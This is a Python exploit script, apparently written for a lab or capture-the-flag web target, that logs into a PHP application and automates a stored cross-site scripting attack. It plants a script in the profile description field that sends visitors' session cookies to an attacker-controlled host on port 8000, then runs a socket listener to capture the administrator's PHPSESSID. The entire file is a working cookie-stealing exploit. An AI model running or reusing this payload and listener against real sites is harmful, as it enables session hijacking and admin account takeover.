import sys, requests, argparse, re, socket

s = requests.session()

def authenticate(ip, user, password):
    target = "http://%s/login.php" % ip
    data = {'username': user,
            'password': password}
    req = s.post(target, data=data, allow_redirects=True)
    res = req.text
    usermatch = re.search(r'<div class="center_div">(.*?)<br>', res)
    if usermatch:
        output = usermatch.group(1)
        print(output)
    else:
        print("\n[!] Failed to authenticate.")
        sys.exit(-1)

def getCookie(lhost):
    print("[+] Listening for callbacks...")
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((lhost,8000))
    s.listen()
    (sock_c, ip_c) = s.accept()
    get = sock_c.recv(4096)
    cookie = get.split(b" HTTP")[0][5:].decode("UTF-8")
    if cookie:
        match = re.search(r"(?<=\?cookie=PHPSESSID=).*", cookie)
        admincookie = match.group(0)
        print("\n[+] Admin cookie retrieved:",admincookie)
        return admincookie

def delivery(ip, lhost):
    payload = "<script>document.write('<img src=http://%s:8000/?cookie='+document.cookie+' />');</script>" % lhost
    target = "http://%s/profile.php" % ip
    data = {'description': payload}
    req = s.post(target, data)
    res = req.text
    if "Success" in res:
        print("\n[+] Payload successfully delivered.")
        getCookie(lhost)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--ip', help='Target IP address', required=True)
    parser.add_argument('--user', help='Username', required=True)
    parser.add_argument('--password', help='Password', required=True)
    parser.add_argument('--lhost', help='Local host', required=True)
    args = parser.parse_args()
    ip = args.ip
    user = args.user
    password = args.password
    lhost = args.lhost

    authenticate(ip, user, password)
    delivery(ip, lhost)

if __name__ == "__main__":
	main()
